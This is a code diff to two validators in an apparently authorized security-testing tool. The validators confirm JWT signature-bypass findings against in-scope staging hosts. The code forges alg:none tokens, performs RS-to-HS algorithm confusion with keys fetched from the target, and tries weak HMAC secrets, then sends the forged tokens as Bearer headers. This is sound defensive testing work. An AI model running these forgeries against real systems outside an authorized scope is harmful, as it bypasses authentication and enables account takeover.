@@ -962,14 +962,16 @@ const exploreJwtNoneValidator: Validator = {
   class: "explore.jwt-none",
   name: "JWT alg:none accepted (broken verification)",
   async validate(claim, env) {
-    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown };
+    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown; as?: unknown };
     const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
-    if (typeof d.url !== "string" || typeof d.token !== "string") return no("need detail.url and detail.token (a valid JWT)");
+    if (typeof d.url !== "string") return no("need detail.url");
+    const token = typeof d.token === "string" ? d.token : actorToken(env.options, parseActor(d.as) ?? "a");
+    if (!token) return no("no JWT available: set detail.as to a configured account (or detail.token)");
     const url = resolveExploreUrl(d.url, env.stagingUrl);
     if (!url) return no("not an http(s) URL");
     if (!env.scope.isHostAllowed(url)) return no("off-scope host");
-    const forged = forgeNoneToken(d.token, d.override && typeof d.override === "object" ? d.override as Record<string, unknown> : undefined);
-    if (!forged) return no("detail.token is not a decodable JWT");
+    const forged = forgeNoneToken(token, d.override && typeof d.override === "object" ? d.override as Record<string, unknown> : undefined);
+    if (!forged) return no("the token is not a decodable JWT");
     const read = async (headers: Record<string, string>) => { const r = await safeFetch(url, env.scope, { method: "GET", headers, maxBytes: 512 * 1024 }); return { status: r.status, body: r.body }; };
     const forgedRes = await read({ authorization: `Bearer ${forged}` });
     const anonRes = await read({});
@@ -1153,23 +1155,27 @@ const exploreJwtForgeValidator: Validator = {
   class: "explore.jwt-forge",
   name: "JWT signature bypass (alg:none, algorithm confusion, weak secret)",
   async validate(claim, env) {
-    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown; jwksUrl?: unknown };
+    const d = claim.detail as { url?: unknown; token?: unknown; override?: unknown; jwksUrl?: unknown; as?: unknown };
     const no = (reason: string): ClaimVerdict => ({ claimId: claim.id, state: "unproven", validator: this.name, reason });
-    if (typeof d.url !== "string" || typeof d.token !== "string") return no("need detail.url and detail.token (a valid JWT)");
+    if (typeof d.url !== "string") return no("need detail.url");
+    // The model never sees account tokens: take a real JWT from the configured actor
+    // (like cross-actor), or accept an explicit detail.token for tests.
+    const token = typeof d.token === "string" ? d.token : actorToken(env.options, parseActor(d.as) ?? "a");
+    if (!token) return no("no JWT available: set detail.as to a configured account (or detail.token)");
     const url = resolveExploreUrl(d.url, env.stagingUrl);
     if (!url) return no("not an http(s) URL");
     if (!env.scope.isHostAllowed(url)) return no("off-scope host");
     const base = new URL(url).origin;
     const override = d.override && typeof d.override === "object" ? (d.override as Record<string, unknown>) : undefined;
-    const hdr = headerOf(d.token);
+    const hdr = headerOf(token);
     const candidates: { how: string; token: string }[] = [];
-    for (const t of forgeNoneVariants(d.token, override)) candidates.push({ how: "alg:none", token: t });
+    for (const t of forgeNoneVariants(token, override)) candidates.push({ how: "alg:none", token: t });
     if (isRsaAlg(hdr?.alg)) {
       const pems = await fetchJwkPems(base, env.scope, typeof d.jwksUrl === "string" ? d.jwksUrl : undefined);
-      for (const pem of pems.slice(0, 8)) { const t = forgeHs256(d.token, pem, override); if (t) candidates.push({ how: "RS->HS algorithm confusion", token: t }); }
+      for (const pem of pems.slice(0, 8)) { const t = forgeHs256(token, pem, override); if (t) candidates.push({ how: "RS->HS algorithm confusion", token: t }); }
     }
     if (isHmacAlg(hdr?.alg) || !hdr?.alg) {
-      for (const s of WEAK_SECRETS) { const t = forgeHs256(d.token, s, override); if (t) candidates.push({ how: `weak secret "${s}"`, token: t }); }
+      for (const s of WEAK_SECRETS) { const t = forgeHs256(token, s, override); if (t) candidates.push({ how: `weak secret "${s}"`, token: t }); }
     }
     if (!candidates.length) return no("no forgery candidate (need an RSA token for confusion, an HS token for weak-secret, or any for alg:none)");
     const read = async (tok: string) => { const r = await safeFetch(url, env.scope, { method: "GET", headers: { authorization: `Bearer ${tok}` }, maxBytes: 256 * 1024 }); return { status: r.status, body: r.body }; };
